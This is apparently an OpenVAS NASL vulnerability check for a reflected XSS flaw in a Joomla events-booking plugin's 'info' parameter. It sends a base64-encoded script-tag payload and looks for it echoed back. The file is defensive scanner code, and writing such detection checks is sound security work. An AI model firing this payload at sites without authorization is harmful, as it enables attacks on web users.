###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_joomla_events_booking_pro_xss_vuln.nasl 11866 2018-10-12 10:12:29Z cfischer $
#
# Joomla Joomseller Events Booking Pro 'info' Parameter XSS Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:joomla:joomla";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803851");
  script_version("$Revision: 11866 $");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:12:29 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2013-08-06 14:53:07 +0530 (Tue, 06 Aug 2013)");

  script_name("Joomla Joomseller Events Booking Pro 'info' Parameter XSS Vulnerability");

  script_tag(name:"summary", value:"This host is running Joomla Joomseller Event Booking Pro plugin and is prone
to xss vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request and checks the response.");

  script_tag(name:"solution", value:"Upgrade to JSE Event version 1.0.3.");

  script_tag(name:"insight", value:"Input passed via 'info' parameter to 'mod_eb_v5_mini_calendar/tmpl/tootip.php'
is not properly sanitised before being returned to the user.");

  script_tag(name:"affected", value:"Joomla Components com_events_booking_v5 and com_jse_event before 1.0.3");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attacker to execute arbitrary HTML or
script code and or discloses sensitive information resulting in loss of confidentiality.");

  script_xref(name:"URL", value:"http://inter5.org/archives/262789");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/527775");
  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/joomseller-events-booking-pro-jse-event-cross-site-scripting");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_analysis");
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("joomla/installed");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://joomseller.com/joomla-components/jse-event.html");
  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe:CPE))
  exit(0);

if (!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

url = dir + '/modules/mod_eb_v5_mini_calendar/tmpl/tootip.php?info=' +
            'eyJldmVudHMiOiI8c2NyaXB0PmFsZXJ0KGRvY3VtZW50LmxvY2F0aW' +
            '9uKTs8L3NjcmlwdD4ifQ==';

if (http_vuln_check(port:port, url:url, check_header:TRUE,
                    pattern:"><script>alert\(document\.location\);</script>", extra_check:"com_events_booking")) {
  report = report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(0);
